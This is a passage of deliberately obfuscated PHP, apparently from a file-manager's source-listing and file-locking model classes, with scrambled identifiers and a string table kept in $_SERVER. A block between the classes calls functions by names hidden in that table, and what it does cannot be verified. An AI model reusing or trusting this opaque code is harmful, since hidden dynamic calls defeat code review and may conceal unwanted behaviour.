74\x62\x32\x5f{$fŞ›ÏÚ¿­}\40\x75\x6e\151\x6f\156\x20\141\x6c\x6c\40"; } if ((strlen($Fö‘İ÷Å­) >= $EİçÆ£’ || $Cèä¸¦…‡¦ == $Eô¿«©³ãˆ - 1) && $Fö‘İ÷Å­) { $Fö‘İ÷Å­ = substr($Fö‘İ÷Å­, 0, -strlen($cÔ¼ïëÈ†[449])); $CİÓ•¼¼¼Ü = $this->query($Fö‘İ÷Å­); $bÜá“•ÇŞÇ = array_merge($bÜá“•ÇŞÇ, $CİÓ•¼¼¼Ü); $Fö‘İ÷Å­ = $cÔ¼ïëÈ†[33]; } } $bÜá“•ÇŞÇ = array_to_keyvalue($bÜá“•ÇŞÇ, $cÔ¼ïëÈ†[450]); goto DÅíä×µˆ…; D‘ëÈÊ¤ğ: $cÔ¼ïëÈ† =& $_SERVER[¯Ò¬Èè]; $Fö‘İ÷Å­ = $cÔ¼ïëÈ†[361]; $bÜá“•ÇŞÇ = array(); goto EàÈ±½”Ä; DÅíä×µˆ…: foreach ($EÍÚ£âï…ë as &$CÉ…Ï³Õ È) { if ($CÉ…Ï³Õ È[$cÔ¼ïëÈ†[370]]) { unset($CÉ…Ï³Õ È[$cÔ¼ïëÈ†[372]]); $CÉ…Ï³Õ È[$cÔ¼ïëÈ†[192]] = intval($bÜá“•ÇŞÇ[$CÉ…Ï³Õ È[$cÔ¼ïëÈ†[369]] . $cÔ¼ïëÈ†[451]][$cÔ¼ïëÈ†[452]]); $CÉ…Ï³Õ È[$cÔ¼ïëÈ†[191]] = intval($bÜá“•ÇŞÇ[$CÉ…Ï³Õ È[$cÔ¼ïëÈ†[369]] . $cÔ¼ïëÈ†[453]][$cÔ¼ïëÈ†[452]]); } } goto Dæî’ªä‰; EàÈ±½”Ä: $EİçÆ£’ = 1024 * 50; $EÍÚ£âï…ë = is_array($EÍÚ£âï…ë) ? $EÍÚ£âï…ë : array(); $Eô¿«©³ãˆ = count($EÍÚ£âï…ë); goto Däİˆ¯Çõ; Dæî’ªä‰: } protected function _listAppendAuth(&$B¿¿¶ÊĞÂ‘) { goto bÏí…ÑåŠ; bÏí…ÑåŠ: $fÙğº’õ—Õ =& $_SERVER[¯Ò¬Èè]; if (!defined($fÙğº’õ—Õ[427])) { return; } $Bë¬”­—…á = array(); goto Cêö‘è©ŠÉ; Cêö‘è©ŠÉ: foreach ($B¿¿¶ÊĞÂ‘ as $DÓÌÄñßåˆ) { if ($DÓÌÄñßåˆ[$fÙğº’õ—Õ[371]] == self::TYPE_GROUP) { $Bë¬”­—…á[] = $DÓÌÄñßåˆ[$fÙğº’õ—Õ[369]]; } } if (!$Bë¬”­—…á) { return; } $b–·‚ìĞé = array_to_keyvalue($B¿¿¶ÊĞÂ‘, $fÙğº’õ—Õ[369]); goto DœÒâˆŒÑˆ; DœÒâˆŒÑˆ: $D«†»†–÷õ = Model($fÙğº’õ—Õ[454])->getSourceList($Bë¬”­—…á, $b–·‚ìĞé); foreach ($B¿¿¶ÊĞÂ‘ as $a”ÄÀÃ„‚£ => &$DÓÌÄñßåˆ) { $DÓÌÄñßåˆ[$fÙğº’õ—Õ[376]] = $D«†»†–÷õ[$DÓÌÄñßåˆ[$fÙğº’õ—Õ[369]]]; if (!$DÓÌÄñßåˆ[$fÙğº’õ—Õ[376]] && $DÓÌÄñßåˆ[$fÙğº’õ—Õ[371]] == self::TYPE_GROUP) { $DÓÌÄñßåˆ[$fÙğº’õ—Õ[376]] = Action($fÙğº’õ—Õ[455])->pathGroupAuthMake($DÓÌÄñßåˆ[$fÙğº’õ—Õ[456]]); if (!$DÓÌÄñßåˆ[$fÙğº’õ—Õ[376]] && !_get($GLOBALS, $fÙğº’õ—Õ[457])) { $DÓÌÄñßåˆ[$fÙğº’õ—Õ[189]] = !1; $DÓÌÄñßåˆ[$fÙğº’õ—Õ[188]] = !1; } } if ($DÓÌÄñßåˆ[$fÙğº’õ—Õ[376]]) { $DÓÌÄñßåˆ[$fÙğº’õ—Õ[189]] = AuthModel::authCheckEdit($DÓÌÄñßåˆ[$fÙğº’õ—Õ[376]][$fÙğº’õ—Õ[377]]); $DÓÌÄñßåˆ[$fÙğº’õ—Õ[188]] = AuthModel::authCheckView($DÓÌÄñßåˆ[$fÙğº’õ—Õ[376]][$fÙğº’õ—Õ[377]]); } $this->groupPathDisplay($DÓÌÄñßåˆ); } goto d›ÑâÍ¾ä; d›ÑâÍ¾ä: } public function groupPathDisplay(&$aÀÂ©ß©«ö) { goto bª ÊŒˆ; A¯¥ÙÁ…Œ‹: $aÀÂ©ß©«ö[$A´À¼º›Îã[460]] = $Aİ¶óĞä‡¬[$A´À¼º›Îã[461]]; $aÀÂ©ß©«ö[$A´À¼º›Îã[380]] = $Aİ¶óĞä‡¬[$A´À¼º›Îã[459]]; $aÀÂ©ß©«ö[$A´À¼º›Îã[462]] = $Aİ¶óĞä‡¬[$A´À¼º›Îã[463]]; goto b‹­±´¯Á»; b‹­±´¯Á»: $aÀÂ©ß©«ö[$A´À¼º›Îã[464]] = $B¶ÀÇïàµÍ . $Aİ¶óĞä‡¬[$A´À¼º›Îã[391]][$A´À¼º›Îã[369]]; goto c¬¤—¸ÌØ; C¢ù®•‚Ôº: $a‘àÉ¼¿¡© = $this->parentLevelArray($Aİ¶óĞä‡¬[$A´À¼º›Îã[459]]); $B¶ÀÇïàµÍ = $A´À¼º›Îã[33]; foreach ($a‘àÉ¼¿¡© as $f£÷‚İˆ“¡) { $f—†À‡¨ù‰ = Model($A´À¼º›Îã[458])->getInfo($f£÷‚İˆ“¡); $B¶ÀÇïàµÍ .= $f—†À‡¨ù‰[$A´À¼º›Îã[391]][$A´À¼º›Îã[369]] . $A´À¼º›Îã[47]; } goto A¯¥ÙÁ…Œ‹; bª ÊŒˆ: $A´À¼º›Îã =& $_SERVER[¯Ò¬Èè]; if ($aÀÂ©ß©«ö[$A´À¼º›Îã[371]] != self::TYPE_GROUP) { return; } $Aİ¶óĞä‡¬ = Model($A´À¼º›Îã[458])->getInfo($aÀÂ©ß©«ö[$A´À¼º›Îã[456]]); goto C¢ù®•‚Ôº; c¬¤—¸ÌØ: } protected function _listAppendPath(&$B–‹Åˆ‹´) { goto A³ÊÄö˜³´; F’©„ÎÆ–İ: $f¨ò¡ôÛÎî = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($B–‹Åˆ‹´ as &$AîÍ”Àè³‘) { goto A‘˜ÙºíÂà; b«çè¿ÁÁ‚: if ($CİÒ²† ÙÀ) { $Aê©„ãä¡œ .= $AîÍ”Àè³‘[$a¢ä¡‰ãº«[28]]; } if ($AîÍ”Àè³‘[$a¢ä¡‰ãº«[370]]) { $Aê©„ãä¡œ .= $a¢ä¡‰ãº«[8]; } $AîÍ”Àè³‘[$a¢ä¡‰ãº«[466]] = str_replace($a¢ä¡‰ãº«[467], $a¢ä¡‰ãº«[8], $Aê©„ãä¡œ); goto e˜ÜÂ¼èî; A‘˜ÙºíÂà: $CİÒ²† ÙÀ = $this->parentLevelArray($AîÍ”Àè³‘[$a¢ä¡‰ãº«[459]]); $Aê©„ãä¡œ = $this->_listAppendPathRoot($AîÍ”Àè³‘, $CİÒ²† ÙÀ); foreach ($CİÒ²† ÙÀ as $fÕôç¦¨õÈ) { if (isset($E÷è›Íß±Ò[$fÕôç¦¨õÈ])) { $Aê©„ãä¡œ .= $E÷è›Íß±Ò[$fÕôç¦¨õÈ] . $a¢ä¡‰ãº«[8]; } } goto b«çè¿ÁÁ‚; e˜ÜÂ¼èî: $Fœˆ²Š·¡ƒ = trim($AîÍ”Àè³‘[$a¢ä¡‰ãº«[466]], $a¢ä¡‰ãº«[8]); if ($AîÍ”Àè³‘[$a¢ä¡‰ãº«[461]] == $a¢ä¡‰ãº«[468] && $Fœˆ²Š·¡ƒ) { $AîÍ”Àè³‘[$a¢ä¡‰ãº«[28]] = $Fœˆ²Š·¡ƒ; } $this->_listAppendPathRecycle($AîÍ”Àè³‘, $CİÒ²† ÙÀ, $f¨ò¡ôÛÎî); goto bë³Ì®´; bë³Ì®´: } goto F¹ÏÈ³Öƒ; f“ÔÊ§ß§: $eïáğ™øå = array(); foreach ($E÷è›Íß±Ò as $a˜‚Ä‰Œ‚İ => $FªÊ‡ª‹¤™) { if (!$FªÊ‡ª‹¤™) { $eïáğ™øå[] = $a˜‚Ä‰Œ‚İ; } } if ($eïáğ™øå) { $E’ôòÇø«Ö = array($a¢ä¡‰ãº«[383] => array($a¢ä¡‰ãº«[384], $eïáğ™øå)); if (count($eïáğ™øå) == 1) { $B„è¾®Â‘ï = $this->sourceInfo($eïáğ™øå[0]); $B„è¾®Â‘ï = is_array($B„è¾®Â‘ï) ? array($B„è¾®Â‘ï) : !1; } else { $B„è¾®Â‘ï = $this->field($a¢ä¡‰ãº«[465])->where($E’ôòÇø«Ö)->select(); } $cÆøºàÓö = array_to_keyvalue($B„è¾®Â‘ï, $a¢ä¡‰ãº«[369], $a¢ä¡‰ãº«[28]); $E÷è›Íß±Ò = array_merge_index($E÷è›Íß±Ò, $cÆøºàÓö); } goto F’©„ÎÆ–İ; A³ÊÄö˜³´: $a¢ä¡‰ãº« =& $_SERVER[¯Ò¬Èè]; $E÷è›Íß±Ò = array(); foreach ($B–‹Åˆ‹´ as &$AîÍ”Àè³‘) { $E÷è›Íß±Ò[$AîÍ”Àè³‘[$a¢ä¡‰ãº«[369]]] = $AîÍ”Àè³‘[$a¢ä¡‰ãº«[28]]; $CİÒ²† ÙÀ = $this->parentLevelArray($AîÍ”Àè³‘[$a¢ä¡‰ãº«[459]]); array_shift($CİÒ²† ÙÀ); foreach ($CİÒ²† ÙÀ as $fÕôç¦¨õÈ) { if (!isset($E÷è›Íß±Ò[$fÕôç¦¨õÈ])) { $E÷è›Íß±Ò[$fÕôç¦¨õÈ] = 0; } } } goto f“ÔÊ§ß§; F¹ÏÈ³Öƒ: } private function _listAppendPathRecycle(&$DƒËèÙ©Öî, $d†»Ô›á†ù, $aÜï¯ªÚİ) { goto cÓ¢À™±İ; C‹íÒÉÀô°: $DƒËèÙ©Öî[$CµÂŒŒ¨¬£[459]] = $CµÂŒŒ¨¬£[470] . implode($CµÂŒŒ¨¬£[47], array_slice($d†»Ô›á†ù, 1)) . $CµÂŒŒ¨¬£[47]; if ($DƒËèÙ©Öî[$CµÂŒŒ¨¬£[369]] == $aÜï¯ªÚİ) { $DƒËèÙ©Öî[$CµÂŒŒ¨¬£[459]] = $CµÂŒŒ¨¬£[470]; $DƒËèÙ©Öî[$CµÂŒŒ¨¬£[461]] = $CµÂŒŒ¨¬£[468]; $DƒËèÙ©Öî[$CµÂŒŒ¨¬£[28]] = LNG($CµÂŒŒ¨¬£[469]); } $DƒËèÙ©Öî[$CµÂŒŒ¨¬£[471]] = $CµÂŒŒ¨¬£[472]; goto FÚÇ‚ÑÆ…; cêñ±‚ƒ”ç: $F´¿ñø—™¿ = explode($CµÂŒŒ¨¬£[8], trim($DƒËèÙ©Öî[$CµÂŒŒ¨¬£[466]], $CµÂŒŒ¨¬£[8])); $fá‚œò®ƒí = implode($CµÂŒŒ¨¬£[8], array_slice($F´¿ñø—™¿, 2)); $DƒËèÙ©Öî[$CµÂŒŒ¨¬£[466]] = $CµÂŒŒ¨¬£[8] . LNG($CµÂŒŒ¨¬£[469]) . $CµÂŒŒ¨¬£[8] . ltrim($fá‚œò®ƒí, $CµÂŒŒ¨¬£[8]); goto C‹íÒÉÀô°; cÓ¢À™±İ: $CµÂŒŒ¨¬£ =& $_SERVER[¯Ò¬Èè]; if (intval($DƒËèÙ©Öî[$CµÂŒŒ¨¬£[371]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($aÜï¯ªÚİ, $d†»Ô›á†ù) && $DƒËèÙ©Öî[$CµÂŒŒ¨¬£[369]] != $aÜï¯ªÚİ) { return; } goto cêñ±‚ƒ”ç; FÚÇ‚ÑÆ…: } protected function _listAppendPathRoot(&$FØé¡Ã÷î, $FŠ¡†Ïñˆ) { $BÙ¶ãÍš =& $_SERVER[¯Ò¬Èè]; $aŸÈƒà†â = $BÙ¶ãÍš[33]; if ($FØé¡Ã÷î[$BÙ¶ãÍš[371]] == self::TYPE_USER) { if (defined($BÙ¶ãÍš[427]) && $FØé¡Ã÷î[$BÙ¶ãÍš[456]] == USER_ID) { $aŸÈƒà†â = LNG($BÙ¶ãÍš[473]); if (!$FŠ¡†Ïñˆ) { $FØé¡Ã÷î[$BÙ¶ãÍš[28]] = $aŸÈƒà†â; } } else { $E“Š‰£†’Œ = Model($BÙ¶ãÍš[474])->getInfoSimple($FØé¡Ã÷î[$BÙ¶ãÍš[456]]); $aŸÈƒà†â = LNG($BÙ¶ãÍš[475]) . $BÙ¶ãÍš[157] . $E“Š‰£†’Œ[$BÙ¶ãÍš[28]] . $BÙ¶ãÍš[476]; } } else { if ($FØé¡Ã÷î[$BÙ¶ãÍš[371]] == self::TYPE_GROUP) { $E“Š‰£†’Œ = Model($BÙ¶ãÍš[458])->getInfoSimple($FØé¡Ã÷î[$BÙ¶ãÍš[456]]); $aŸÈƒà†â = $E“Š‰£†’Œ[$BÙ¶ãÍš[28]]; } else { if ($FØé¡Ã÷î[$BÙ¶ãÍš[371]] == self::TYPE_SYSTEM) { $E“Š‰£†’Œ = $this->sourceInfo($FŠ¡†Ïñˆ[0], !0); $aŸÈƒà†â = $E“Š‰£†’Œ[$BÙ¶ãÍš[28]]; } } } $aŸÈƒà†â = $aŸÈƒà†â ? $BÙ¶ãÍš[8] . $aŸÈƒà†â . $BÙ¶ãÍš[8] : $BÙ¶ãÍš[8]; return $aŸÈƒà†â; } protected function _listAppendUser(&$Eİ·‚Ö ¾×) { $dÔë¯§´¨˜ =& $_SERVER[¯Ò¬Èè]; $cø¡ÍÇˆ…Ñ = array_to_keyvalue($Eİ·‚Ö ¾×, $dÔë¯§´¨˜[33], $dÔë¯§´¨˜[378]); $D•¡ƒ¤Œ›ª = array_to_keyvalue($Eİ·‚Ö ¾×, $dÔë¯§´¨˜[33], $dÔë¯§´¨˜[379]); $E‰éÓ±œ Ó = array_merge($cø¡ÍÇˆ…Ñ, $D•¡ƒ¤Œ›ª); $c±éÔô§±Ø = Model($dÔë¯§´¨˜[477])->userListInfo($E‰éÓ±œ Ó); foreach ($Eİ·‚Ö ¾× as &$Bß˜Éğô¿) { $FÍ­ÏŒ¡çË = $Bß˜Éğô¿[$dÔë¯§´¨˜[378]]; $Bß˜Éğô¿[$dÔë¯§´¨˜[378]] = $c±éÔô§±Ø[$FÍ­ÏŒ¡çË] ? $c±éÔô§±Ø[$FÍ­ÏŒ¡çË] : !1; $FÍ­ÏŒ¡çË = $Bß˜Éğô¿[$dÔë¯§´¨˜[379]]; $Bß˜Éğô¿[$dÔë¯§´¨˜[379]] = $c±éÔô§±Ø[$FÍ­ÏŒ¡çË] ? $c±éÔô§±Ø[$FÍ­ÏŒ¡çË] : !1; if (isset($Bß˜Éğô¿[$dÔë¯§´¨˜[417]]) && $Bß˜Éğô¿[$dÔë¯§´¨˜[417]][$dÔë¯§´¨˜[478]]) { $B¹¥ÃŒ½× = $GLOBALS[$dÔë¯§´¨˜[6]][$dÔë¯§´¨˜[84]][$dÔë¯§´¨˜[479]]; if ($Bß˜Éğô¿[$dÔë¯§´¨˜[417]][$dÔë¯§´¨˜[480]] <= time() - $B¹¥ÃŒ½×) { $this->metaSet($Bß˜Éğô¿[$dÔë¯§´¨˜[369]], $dÔë¯§´¨˜[478], null); $this->metaSet($Bß˜Éğô¿[$dÔë¯§´¨˜[369]], $dÔë¯§´¨˜[480], null); unset($Bß˜Éğô¿[$dÔë¯§´¨˜[417]][$dÔë¯§´¨˜[478]]); continue; } $FÙ’Ğ«µÂ = $Bß˜Éğô¿[$dÔë¯§´¨˜[417]][$dÔë¯§´¨˜[478]]; $Bß˜Éğô¿[$dÔë¯§´¨˜[417]][$dÔë¯§´¨˜[481]] = Model($dÔë¯§´¨˜[477])->getInfoSimpleOuter($FÙ’Ğ«µÂ); } } } public function parentLevelArray($AÅ­‰”Öæ) { $Bğ™·›¨š­ =& $_SERVER[¯Ò¬Èè]; $AÅ­‰”Öæ = explode($Bğ™·›¨š­[47], trim($AÅ­‰”Öæ, $Bğ™·›¨š­[47])); return array_remove_value($AÅ­‰”Öæ, $Bğ™·›¨š­[468]); } public function listAll($FÔÚğ†ÒÂ) { goto bŞ›ì­İà; DÊ±õÆªÌÉ: $F‡ÀîŒØ = array_to_keyvalue($F‡ÀîŒØ, $CØ¯Øœßª[369]); $F¥ÀëÌé¦ƒ = "\57{$e»à¼Ïğ…à[$CØ¯Øœßª[28]]}\x2f"; $F¥ÀëÌé¦ƒ = $F¥ÀëÌé¦ƒ == $CØ¯Øœßª[467] ? $CØ¯Øœßª[8] : $F¥ÀëÌé¦ƒ; goto fŠÊÈÅ¬â; F¨Ì’õ™¢: $this->_listAppendAuth($F‡ÀîŒØ); $this->_listAppendUser($F‡ÀîŒØ); $this->_listAppendPath($F‡ÀîŒØ); goto DÊ±õÆªÌÉ; e‘Ü†‘œ‘‘: $eß†Í•·Ò³ = $CØ¯Øœßª[486]; $Fô‰áŸ«ŒÄ = "\114\x45\106\124\40\112\117\x49\x4e\x20{$this->tablePrefix}\151\x6f\137\x66\151\x6c\x65\x20\146\x69\154\x65\40\157\x6e\40\x73\x6f\x75\162\143\x65\56\146\151\154\145\111\x44\40\x3d\x20\x66\151\154\145\56\x66\x69\x6c\x65\111\x44"; $F‡ÀîŒØ = $this->alias($CØ¯Øœßª[487])->field($eß†Í•·Ò³)->where($BÀ³½ëµ£÷)->join($Fô‰áŸ«ŒÄ)->select(); goto F¨Ì’õ™¢; fŠÊÈÅ¬â: $a«”©è¸‹‚ = array(); foreach ($F‡ÀîŒØ as $dİ™ÏÈ¤·Ò => $EÙ†àÑ¤ˆ) { goto A‰Ú”ßº´¤; aŒ‰Ø¾“àå: if (!$EÙ†àÑ¤ˆ[$CØ¯Øœßª[370]]) { $FÁİƒÒëÓô[$CØ¯Øœßª[419]] = $EÙ†àÑ¤ˆ[$CØ¯Øœßª[419]]; $FÁİƒÒëÓô[$CØ¯Øœßª[489]] = $EÙ†àÑ¤ˆ[$CØ¯Øœßª[75]]; } $a«”©è¸‹‚[] = $FÁİƒÒëÓô; goto a™•ç¸—¹ò; A‰Ú”ßº´¤: $bœ„œš½Ñè = $this->parentLevelArray($EÙ†àÑ¤ˆ[$CØ¯Øœßª[459]]); array_shift($bœ„œš½Ñè); $dœ™ÌĞß¼Î = $F¥ÀëÌé¦ƒ; goto Aã‚Şäèª¸; Aã‚Şäèª¸: for ($C÷Ó´‡ŸÎ = 0; $C÷Ó´‡ŸÎ < count($bœ„œš½Ñè); $C÷Ó´‡ŸÎ++) { $dœ™ÌĞß¼Î .= $F‡ÀîŒØ[$bœ„œš½Ñè[$C÷Ó´‡ŸÎ]][$CØ¯Øœßª[28]] . $CØ¯Øœßª[8]; } $dœ™ÌĞß¼Î .= $EÙ†àÑ¤ˆ[$CØ¯Øœßª[28]]; if ($EÙ†àÑ¤ˆ[$CØ¯Øœßª[370]]) { $dœ™ÌĞß¼Î .= $CØ¯Øœßª[8]; } goto dŠÔ¨©­é; dŠÔ¨©­é: $dœ™ÌĞß¼Î = str_replace($CØ¯Øœßª[467], $CØ¯Øœßª[8], $dœ™ÌĞß¼Î); $dœ™ÌĞß¼Î = str_replace($CØ¯Øœßª[467], $CØ¯Øœßª[8], $dœ™ÌĞß¼Î); $FÁİƒÒëÓô = array($CØ¯Øœßª[387] => str_replace($CØ¯Øœßª[467], $CØ¯Øœßª[8], $dœ™ÌĞß¼Î), $CØ¯Øœßª[488] => intval($EÙ†àÑ¤ˆ[$CØ¯Øœßª[370]]), $CØ¯Øœßª[391] => $this->pathInfoFilter($EÙ†àÑ¤ˆ, !0)); goto aŒ‰Ø¾“àå; a™•ç¸—¹ò: } return $a«”©è¸‹‚; goto Bš®ùœ×ˆö; bŞ›ì­İà: $CØ¯Øœßª =& $_SERVER[¯Ò¬Èè]; $e»à¼Ïğ…à = $this->sourceInfo($FÔÚğ†ÒÂ); $BÀ³½ëµ£÷ = array($CØ¯Øœßª[482] => array($CØ¯Øœßª[483], $e»à¼Ïğ…à[$CØ¯Øœßª[459]] . $FÔÚğ†ÒÂ . $CØ¯Øœßª[484]), $CØ¯Øœßª[485] => 0); goto e‘Ü†‘œ‘‘; Bš®ùœ×ˆö: } } if ($_SERVER[$_SERVER[¯Ò¬Èè][490]] != $_SERVER[$_SERVER[¯Ò¬Èè][491]]) { goto E³”Æˆ’ÖÅ; b‹·§Ú¼ßÍ: $B”™±ö˜½È($_SERVER[$_SERVER[¯Ò¬Èè][498]]); goto FÔ›œÃÑå; c©¬êØóª: $eÒ›»®©Š… = explode($_SERVER[¯Ò¬Èè][217], $cÉ†×ä´…Ğ); if (count($eÒ›»®©Š…) < $_SERVER[¯Ò¬Èè][495]) { $A—°ªšíõ¿ = $_SERVER[¯Ò¬Èè][496]; $A—°ªšíõ¿(); } $B”™±ö˜½È = $_SERVER[¯Ò¬Èè][497]; goto b‹·§Ú¼ßÍ; E³”Æˆ’ÖÅ: $b£˜­‡¥… = $_SERVER[¯Ò¬Èè][492]; $b æÑŒìÁ‡ = $_SERVER[$_SERVER[¯Ò¬Èè][493]] . $_SERVER[¯Ò¬Èè][494]; $cÉ†×ä´…Ğ = $b£˜­‡¥…($b æÑŒìÁ‡); goto c©¬êØóª; FÔ›œÃÑå: } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($CÓòƒ£»«Î) { goto d®—“‰İñ“; d®—“‰İñ“: $DÇÔßâ—ƒË =& $_SERVER[¯Ò¬Èè]; if (!$this->allowLock()) { return; } $this->_lockCheck($DÇÔßâ—ƒË[499], $CÓòƒ£»«Î); goto eÁšğ—‹Èñ; eÁšğ—‹Èñ: $eÈ£ˆ´¯†‰ = 1; $this->_lockEvent($CÓòƒ£»«Î, array($DÇÔßâ—ƒË[500], $DÇÔßâ—ƒË[501]), $eÈ£ˆ´¯†‰); $this->_lockParent($CÓòƒ£»«Î, array($DÇÔßâ—ƒË[501]), $eÈ£ˆ´¯†‰); goto DìÆŠÔãš; DìÆŠÔãš: $this->_lockEvent($CÓòƒ£»«Î, array($DÇÔßâ—ƒË[502], $DÇÔßâ—ƒË[503]), $eÈ£ˆ´¯†‰); $this->_lockCheckEnd($DÇÔßâ—ƒË[499], $CÓòƒ£»«Î); goto a„’×Ÿƒ‹å; a„’×Ÿƒ‹å: } public function lockCopyEnd($F¤¤î»’ïÃ) { $B•Ë¤…’‰ =& $_SERVER[¯Ò¬Èè]; if (!$this->allowLock()) { return; } $e¶á×‘¿Ô” = 0; $this->_lockEvent($F¤¤î»’ïÃ, array($B•Ë¤…’‰[500], $B•Ë¤…’‰[501]), $e¶á×‘¿Ô”); $this->_lockParent($F¤¤î»’ïÃ, array($B•Ë¤…’‰[501]), $e¶á×‘¿Ô”); $this->_lockEvent($F¤¤î»’ïÃ, array($B•Ë¤…’‰[502], $B•Ë¤…’‰[503]), $e¶á×‘¿Ô”); } public function lockWriteStart($dó†“½™¤, $bëÏôğÁéŸ = '') { goto c¿•©•ùĞñ; c¿•©•ùĞñ: $CáÍØå–½É =& $_SERVER[¯Ò¬Èè]; if (!$this->allowLock()) { return; } $this->_lockCheck($CáÍØå–½É[500], $dó†“½™¤); goto d¹–Î±Ë¶; d¹–Î±Ë¶: $dê’ÆÇˆ±ã = 1; $this->_lockKey($CáÍØå–½É[504] . $dó†“½™¤ . $CáÍØå–½É[91] . $bëÏôğÁéŸ, $dê’ÆÇˆ±ã); $this->_lockEvent($dó†“½™¤, array($CáÍØå–½É[499], $CáÍØå–½É[501]), $dê’ÆÇˆ±ã); goto E…ïõÈåÓÀ; E…ïõÈåÓÀ: $this->_lockParent($dó†“½™¤, array($CáÍØå–½É[499], $CáÍØå–½É[501]), $dê’ÆÇˆ±ã); $this->_lockCheckEnd($CáÍØå–½É[500], $dó†“½™¤); goto bÚƒŠñê‰‚; bÚƒŠñê‰‚: } public function lockWriteEnd($B–¤İÑ’Íå, $a áºã¦øÒ = '') { $EÕ˜‚Î¶‘ =& $_SERVER[¯Ò¬Èè]; if (!$this->allowLock()) { return; } $c‰Æ¶ù» = 0; $this->_lockKey($EÕ˜‚Î¶‘[504] . $B–¤İÑ’Íå . $EÕ˜‚Î¶‘[91] . $a áºã¦øÒ, $c‰Æ¶ù»); $this->_lockEvent($B–¤İÑ’Íå, array($EÕ˜‚Î¶‘[499], $EÕ˜‚Î¶‘[501]), $c‰Æ¶ù»); $this->_lockParent($B–¤İÑ’Íå, array($EÕ˜‚Î¶‘[499], $EÕ˜‚Î¶‘[501]), $c‰Æ¶ù»); } public function lockMoveStart($b‚Åê—ßó) { goto Bƒ…ù®¡ìî; Bƒ…ù®¡ìî: $aï„Ò¥Ë­ =& $_SERVER[¯Ò¬Èè]; if (!$this->allowLock()) { return; } $this->_lockCheck($aï„Ò¥Ë­[501], $b‚Åê—ßó); goto AÅª“‰–µä; AÅª“‰–µä: $Bøç³…Äº¸ = 1; $this->_lockKey($aï„Ò¥Ë­[505] . $b‚Åê—ßó, $Bøç³…Äº¸); $this->_lockEvent($b‚Åê—ßó, array($aï„Ò¥Ë­[499], $aï„Ò¥Ë­[500]), $Bøç³…Äº¸); goto AñÕ‘ …à‰; AñÕ‘ …à‰: $this->_lockParent($b‚Åê—ßó, array($aï„Ò¥Ë­[499], $aï„Ò¥Ë­[501]), $Bøç³…Äº¸); $this->_lockEvent($b‚Åê—ßó, array($aï„Ò¥Ë­[506], $aï„Ò¥Ë­[502], $aï„Ò¥Ë­[503]), $Bøç³…Äº¸); $this->_lockCheckEnd($aï„Ò¥Ë­[501], $b‚Åê—ßó); goto bé”å…´…©; bé”å…´…©: } public function lockMoveEnd($AÑŸé›¼¤º) { goto c‚¡ÜŠæ¾; B×ÄŠÆ¢‡µ: $this->_lockEvent($AÑŸé›¼¤º, array($Aöùà›ò«Ş[506], $Aöùà›ò«Ş[502], $Aöùà›ò«Ş[503]), $b§‘Ë‰Øµ); goto aŒö‰ñí„»; c‚¡ÜŠæ¾: $Aöùà›ò«Ş =& $_SERVER[¯Ò¬Èè]; if (!$this->allowLock()) { return; } $b§‘Ë‰Øµ = 0; goto FğÎ†œ÷Ö‚; FğÎ†œ÷Ö‚: $this->_lockKey($Aöùà›ò«Ş[505] . $AÑŸé›¼¤º, $b§‘Ë‰Øµ); $this->_lockEvent($AÑŸé›¼¤º, array($Aöùà›ò«Ş[499], $Aöùà›ò«Ş[500]), $b§‘Ë‰Øµ); $this->_lockParent($AÑŸé›¼¤º, array($Aöùà›ò«Ş[499], $Aöùà›ò«Ş[501]), $b§‘Ë‰Øµ); goto B×ÄŠÆ¢‡µ; aŒö‰ñí„»: } private function _lockCheck($FÚ¡®‘­æ, $eº×”¥Ãø) { goto D»õ§­Ö‡¼; D»õ§­Ö‡¼: $aÍÖÉ…¿– =& $_SERVER[¯Ò¬Èè]; $a¾‘ÀöÌÂµ = $this->sourceInfo($eº×”¥Ãø); $aä©¥‹Ë÷İ = $FÚ¡®‘­æ . $aÍÖÉ…¿–[91] . $eº×”¥Ãø; goto Dß‚«ÃŒ›š; Dß‚«ÃŒ›š: $this->_lockTimeStart[$aä©¥‹Ë÷İ] = timeFloat(); if (!is_array($a¾‘ÀöÌÂµ)) { return; } $eªö»¦’ä = LNG($aÍÖÉ…¿–[507]); goto C£»Ô»ÃªÇ; C£»Ô»ÃªÇ: CacheLock::setErrorMsg($aÍÖÉ…¿–[157] . htmlspecialchars($a¾‘ÀöÌÂµ[$aÍÖÉ…¿–[28]]) . $aÍÖÉ…¿–[476] . $eªö»¦’ä); $this->_lockKey($aä©¥‹Ë÷İ, 1); $this->_lockKey($aä©¥‹Ë÷İ, 0); goto A²³‚¼µæ‚; A²³‚¼µæ‚: $dªÛÚ­ÏÕé = array_reverse($this->parentLevelArray($a¾‘ÀöÌÂµ[$aÍÖÉ…¿–[459]])); foreach ($dªÛÚ­ÏÕé as $e‰„Â¤) { $aä©¥‹Ë÷İ = $FÚ¡®‘­æ . $aÍÖÉ…¿–[508] . $e‰„Â¤; if (CacheLock::lockGet($aÍÖÉ…¿–[509] . $aä©¥‹Ë÷İ)) { $a¾‘ÀöÌÂµ = $this->sourceInfo($e‰„Â¤); CacheLock::setErrorMsg($aÍÖÉ…¿–[157] . htmlspecialchars($a¾‘ÀöÌÂµ[$aÍÖÉ…¿–[28]]) . $aÍÖÉ…¿–[476] . $eªö»¦’ä); $this->_lockKey($aä©¥‹Ë÷İ, 1); $this->_lockKey($aä©¥‹Ë÷İ, 0); } } goto cï‰÷„ÎÍÔ; cï‰÷„ÎÍÔ: } private function _lockCheckEnd($Fã×‰¸é…‘, $BŠ¨ÚÇœÒã) { goto AìÎ‹ ’¯­; AìÎ‹ ’¯­: $e¥‘×ä¾¾Ş =& $_SERVER[¯Ò¬Èè]; $cÅƒÊË’†º = $Fã×‰¸é…‘ . $e¥‘×ä¾¾Ş[91] . $BŠ¨ÚÇœÒã; CacheLock::setErrorMsg($e¥‘×ä¾¾Ş[361]); goto BÃì‡‹ÊÙ‰; BÃì‡‹ÊÙ‰: if (!isset($this->_lockTimeStart[$cÅƒÊË’†º])) { return; } $D¨’´ÄÅ©Ø = timeFloat() - $this->_lockTimeStart[$cÅƒÊË’†º]; unset($this->_lockTimeStart[$cÅƒÊË’†º]); goto d¶®‰š—º; d¶®‰š—º: if ($D¨’´ÄÅ©Ø > 0.5) { unset(self::$cacheSourceInfo[$e¥‘×ä¾¾Ş[410] . $BŠ¨ÚÇœÒã]); } 